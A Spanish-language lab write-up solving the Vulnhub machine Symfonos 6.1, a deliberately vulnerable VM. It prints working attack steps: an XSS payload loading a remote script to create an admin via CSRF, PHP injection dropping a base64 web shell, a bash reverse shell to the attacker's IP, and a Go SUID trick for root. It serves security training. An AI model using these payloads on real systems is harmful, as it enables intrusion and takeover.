---
author: Helder
title: Vulnhub - Symfonos 6.1
tags : [Linux,XSS,CSRF]
categories: [Vulnhub,Medium]
date: 2023-10-15 11:33:00 +0800
mermaid: true
---

Máquina [**Symfonos 6.1**](https://www.vulnhub.com/entry/symfonos-61,458/)

---
## Reconocimiento
Identificamos el Target y escaneamos los puertos abiertos.
![arp](https://helhat.github.io/assets/img/Symfonos/arp.png){: .normal }

![scan1](https://helhat.github.io/assets/img/Symfonos/scan1.png){: .normal }

Se analiza los principales scripts y versiones con nmap.

![scan2](https://helhat.github.io/assets/img/Symfonos/scan2.png){: .normal }

![scan22](https://helhat.github.io/assets/img/Symfonos/scan22.png){: .normal }

---
## Enumeración

### ssh

Con esta version podemos buscar un exploit para enumeracion de usuarios. Esto con la finalidad de encontrar usernames.

![enum](https://helhat.github.io/assets/img/Symfonos/enum.png){: .normal }
```
python2.7 45939.py IP root 2>/dev/null
```
✔Error relacionado al módulo "paramiko", deben descargar pip2  https://bootstrap.pypa.io/pip/2.7/get-pip.py . Lo instalan con python2.7 luego hacen pip2 install paramiko.

### http
Buscaremos tecnologias web con wappalyzer o whatweb.

![wappalyzer](https://helhat.github.io/assets/img/Symfonos/wappalyzer.png){: .normal }

Verificamos en la web, el otro puerto 5000.

![port](https://helhat.github.io/assets/img/Symfonos/port.png){: .normal }

De igual manera verificamos el puerto 3000, en donde encontramos una web symfonos con un servicio git.

![wappa](https://helhat.github.io/assets/img/Symfonos/wappa.png){: .normal }

Enumeramos toda la web y en el apartado explore encontramos 2 usuarios.

![users](https://helhat.github.io/assets/img/Symfonos/users.png){: .normal }

Ademas de un panel de logueo. Que por el momento lo dejaremos como esta.

![login](https://helhat.github.io/assets/img/Symfonos/login.png){: .normal }

### MySQL
Enumerando el puerto 3306, nos indica que desde nuestra IP, no podemos acceder a este servicio

![msql](https://helhat.github.io/assets/img/Symfonos/msql.png){: .normal }

### Fuzzing
Al realizar un fuzzing con gobuster, econtramos 2 rutas:

![fuzz](https://helhat.github.io/assets/img/Symfonos/fuzz.png){: .normal }

1. Empezamos con esta primera ruta /posts, tratamos de enumerar recursos importantes.

![post](https://helhat.github.io/assets/img/Symfonos/post.png){: .normal }
![fuzz2](https://helhat.github.io/assets/img/Symfonos/fuzz2.png){: .normal }
![includes](https://helhat.github.io/assets/img/Symfonos/includes.png){: .normal }

2. Enumeramos la otra ruta /flyspray encontrada en el primer fuzzing.Es aqui donde tenemos una plataforma con tareas asignadas.

![fly](https://helhat.github.io/assets/img/Symfonos/fly.png){: .normal }

---
## Explotacion
### XSS y CSRF
Buscamos exploits, encontrando 2 archivos interesantes, pero no sabemos que version es la plataforma actual.

![search](https://helhat.github.io/assets/img/Symfonos/search.png){: .normal }

Como no sabemos la version, buscaremos en la web para identificar si es Open Source,esto con la finalidad de ver los cambios que ha tenido la aplicacion, un archivo recurrente es changelog.

![search2](https://helhat.github.io/assets/img/Symfonos/search2.png){: .normal }
![docs](https://helhat.github.io/assets/img/Symfonos/docs.png){: .normal }

Pero el archivo no nos muestra mucha informacion.

![chang](https://helhat.github.io/assets/img/Symfonos/chang.png){: .normal }

Enumerando los archivos encontramos un upgrading, al leer encontramos que tiene una ultima actualizacion.

![vers](https://helhat.github.io/assets/img/Symfonos/vers.png){: .normal }

Buscamos un exploit con esta version en searchsploit y econtramos la version que coincide con la encontrada.
En esta tiene una descripcion que indica en que parametro se acontece el XSS y que luego se genera un CSRF con un usuario hacker con permisos administrador.

![desc](https://helhat.github.io/assets/img/Symfonos/desc.png){: .normal }

Adicionalmente se nos brinda el script, esto lo copiaremos y guardaremos.

![script](https://helhat.github.io/assets/img/Symfonos/script.png){: .normal }

Antes de ello observamos que nos podemos registrar.

![reg](https://helhat.github.io/assets/img/Symfonos/reg.png){: .normal }

Entonces procedemos a registrar una cuenta, y en la ruta que se nos indico en el script, existe un parametro *Real Name*, que es vulnerable a XSS, ademas tenemos un usuario admin que ejecuta una accion de actualizacion en el sistema, esto servira para aplicar el CSRF.

![real](https://helhat.github.io/assets/img/Symfonos/real.png){: .normal }
![admin](https://helhat.github.io/assets/img/Symfonos/admin.png){: .normal }

Entonces el primer paso sera verificar si es vulnerable a XSS. Pero observamos que no se ejecuta correctamente,vemos un simbolo que aparece, por ende intuimos que se agrega ">

![xss](https://helhat.github.io/assets/img/Symfonos/xss.png){: .normal }

```
"><script>alert("xss")</script>
```
Al cargar el ID de nuestro usuario, se ejecuta el popup.Confirmando el XSS. De igual manera sucede al ver un comentario.

![xss2](https://helhat.github.io/assets/img/Symfonos/xss2.png){: .normal }
![xss3](https://helhat.github.io/assets/img/Symfonos/xss3.png){: .normal }

Entonces confirmado el XSS, ya podemos aplicar el CSRF para que cree un nuevo usuario administrador. 
Para que cargue este script, forzamos a que cargue este recurso externo con:
```
"><script src="http://192.168.65.139/script.js"></script>
```
Compartimos el archivo con python.
Esperamos que exista la peticion GET.

![serv](https://helhat.github.io/assets/img/Symfonos/serv.png){: .normal }

Y de esta manera accedemos con estas credenciales.

![hack](https://helhat.github.io/assets/img/Symfonos/hack.png){: .normal }

Observando la plataforma vemos una tarea adicional.

![sym](https://helhat.github.io/assets/img/Symfonos/sym.png){: .normal }

Accedemos a este comentario con un click en el ID, en donde tenemos credenciales del usuario achilles. Estas credenciales no permiten iniciar sesion en flyspay, pero si en symfonos.

![report](https://helhat.github.io/assets/img/Symfonos/report.png){: .normal }
![login](https://helhat.github.io/assets/img/Symfonos/login.png){: .normal }

Ahora con acceso , podemos ver los usuarios. 

![gest](https://helhat.github.io/assets/img/Symfonos/gest.png){: .normal }

Al usuario Achilles, observamos 2 repositorios privados.

![repo](https://helhat.github.io/assets/img/Symfonos/repo.png){: .normal }

### Analizar APIs
1. En symfonos-blog --> Primero analizaremos el blog. Que, por el contenido, es de la misma ruta /posts

![achilles](https://helhat.github.io/assets/img/Symfonos/achilles.png){: .normal }
![inc](https://helhat.github.io/assets/img/Symfonos/inc.png){: .normal }

La diferencia es que podemos leer el archivo.php directo de la API o podemos clonarlo en nuestra PC,pero nos pedirá nuevamente las credenciales.

```
git clone http://192.168.65.146:3000/achilles/symfonos-blog
```
Tenemos las credenciales para la Base de datos MySQL

![achilles2](https://helhat.github.io/assets/img/Symfonos/achilles2.png){: .normal }

Pensaríamos que desde nuestra terminal nos podemos conectar, pero recordar que en la etapa de Enumeración nos indicaron que no permite la conexión de otras direcciones IP excepto la del propietario, en este caso Achilles.

```
mariadb -u root -D api -h 192.168.65.146 -p
```

2. En symfonos-api. Tenemos los siguientes recursos.

A) Primero tenemos recursos globales

![achilles3](https://helhat.github.io/assets/img/Symfonos/achilles3.png){: .normal }

En el script main.go , vemos que almacena una petición GET que intenta obtener el valor de una variable de entorno llamada port.

![achilles4](https://helhat.github.io/assets/img/Symfonos/achilles4.png){: .normal }

Y si cargamos el recurso .env

![achilles5](https://helhat.github.io/assets/img/Symfonos/achilles5.png){: .normal }

Podemos observar que tiene un puerto almacenado en el 5000. Que es donde se ejecuta la API. Tener en cuenta ello.

![achilles6](https://helhat.github.io/assets/img/Symfonos/achilles6.png){: .normal }

B) Analizamos la API

![achilles7](https://helhat.github.io/assets/img/Symfonos/achilles7.png){: .normal }

En el script api.go vemos que existe una ruta a /ls2o4g

![achilles8](https://helhat.github.io/assets/img/Symfonos/achilles8.png){: .normal }

Dentro de la version, existe otro script con el mismo nombre

![achilles9](https://helhat.github.io/assets/img/Symfonos/achilles9.png){: .normal }

Es aqui donde nos muestra otra ruta /v1.0 que bajo de esto existe otra ruta /ping

![achilles10](https://helhat.github.io/assets/img/Symfonos/achilles10.png){: .normal }

Entonces copiamos estas rutas pero en el puerto 5000, que es donde se ejecuta la API.

![resp](https://helhat.github.io/assets/img/Symfonos/resp.png){: .normal }
Esto confirma que la ruta existe.

C) Auth

![achilles11](https://helhat.github.io/assets/img/Symfonos/achilles11.png){: .normal }
![achilles12](https://helhat.github.io/assets/img/Symfonos/achilles12.png){: .normal }

Es aqui donde vemos que por json tramita 2 campos para el login.

![achilles13](https://helhat.github.io/assets/img/Symfonos/achilles13.png){: .normal }

Y el otro script 

![achilles14](https://helhat.github.io/assets/img/Symfonos/achilles14.png){: .normal }

Contempla que debajo de la ruta /auth , donde se asignan los Endpoint /login por POST y /check por GET.

![achilles15](https://helhat.github.io/assets/img/Symfonos/achilles15.png){: .normal }

Entonces es momento de intentar loguearnos.

```bash
curl -s -X POST "http://192.168.65.146:5000/ls2o4g/v1.0/auth/login" -H "Content-Type: application/json" -d '{"username":"achilles", "password":"h2sBr9gryBunKdF9"}'
```

![curl](https://helhat.github.io/assets/img/Symfonos/curl.png){: .normal }

Vemos que la ruta ,el header y el contenido es correcto.

D)Posts
![achilles16](https://helhat.github.io/assets/img/Symfonos/achilles16.png){: .normal }
![achilles17](https://helhat.github.io/assets/img/Symfonos/achilles17.png){: .normal }

Vemos en script que tenemos un PATCH que permite subir archivo en /posts, entonces esto nos hace pensar que podemos subir un recurso malicioso y entrando en /posts cargaremos el archivo. Utilizando el ID.

![achilles18](https://helhat.github.io/assets/img/Symfonos/achilles18.png){: .normal }

En la ruta encontrada, vemos un campo text que vale todo el texto descripcion de Achilles.

![resp2](https://helhat.github.io/assets/img/Symfonos/resp2.png){: .normal }

Pero que sucede, si en este campo *text*, podemos ingresar un payload?
Entonces buscaremos un parametro *text*.

![achilles19](https://helhat.github.io/assets/img/Symfonos/achilles19.png){: .normal }

Es aqui, donde observamos que requiere de un campo llamado text, necesario para subir un payload.

![achilles20](https://helhat.github.io/assets/img/Symfonos/achilles20.png){: .normal }

### RCE
Por ultimo Explotamos el JWT, generando una petición PATCH en el endpoit /posts/ con ID:1, el token y el recurso modificado.

```bash
curl -s -X PATCH "http://192.168.65.146:5000/ls2o4g/v1.0/posts/1" -H "Content-Type: application/json" -d '{"text":"prueba"}' -b 'token=asdasdasdad'
```
Como respuesta vemos que *text* muestra prueba

![curl2](https://helhat.github.io/assets/img/Symfonos/curl2.png){: .normal }
![prueba](https://helhat.github.io/assets/img/Symfonos/prueba.png){: .normal }
![prueba2](https://helhat.github.io/assets/img/Symfonos/prueba2.png){: .normal }

Ahora podemos ingresar un comando para comprobar si tenemos RCE

```
sleep(5)
```
Ya verificado que interpreta el sleep.Podemos aplicar la siguiente linea:

```
-d $'{"text":"system('\whoami\')"}' 
```

> Para evitar que entre en conflicto por tantas comillas. Podemos aplicar una funcion con php, llamada *file_put_contents*, que crea un archivo y luego declaras su contenido, para este contenido, lo ingresaremos en base64

```
-d $'{"text":"file_put_contents(\'prueba.txt\',\'Hola mundo\')"}' 
-d $'{"text":"file_put_contents(\'cmd.php\',base64_decode(\'PD9waHAKICBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsKPz4K\'))"}' 
```
Aqui convertimos en base64.

![rev](https://helhat.github.io/assets/img/Symfonos/rev.png){: .normal }

Como respuesta podemos verificar que se interpreta el cuerpo agregado.

![ejec](https://helhat.github.io/assets/img/Symfonos/ejec.png){: .normal }

Comprobada la ejecucion de comando del sistema, agregamos el one liner.

```
bash -c 'bash -i >& /dev/tcp/192.168.65.139/443 0>&1'
```

![netcat](https://helhat.github.io/assets/img/Symfonos/netcat.png){: .normal }

---
## Escala de Privilegios / Persistencia

Ya con acceso verificamos los usuarios en el sistema, y podemos escalar privilegios a Achilles.

![user](https://helhat.github.io/assets/img/Symfonos/user.png){: .normal }

Verificamos los permisos sudo.

![sudo](https://helhat.github.io/assets/img/Symfonos/sudo.png){: .normal }

Entonces como podemos ejecutar con go cualquier script como suid.

Creamos un script para cambiar los permisos de una bash.

```go
package main
import (
    "log"
    "os/exec"
)

func main() {
    cmd := exec.Command("chmod", "u+s", "/bin/bash")
    err := cmd.Run()
	if  err != nil {
		log.Fatal(err)
	}		
}
```
Observamos que originalmente no tiene permisos SUID, pero luego de ejecutar como sudo go el binario creado para cambiar permisos a la bash, podremos escalar privilegios.

![bash](https://helhat.github.io/assets/img/Symfonos/bash.png){: .normal }
![bash2](https://helhat.github.io/assets/img/Symfonos/bash2.png){: .normal }

Ejecutamos la bash
```
bash -p
```
![root](https://helhat.github.io/assets/img/Symfonos/root.png){: .normal }

---


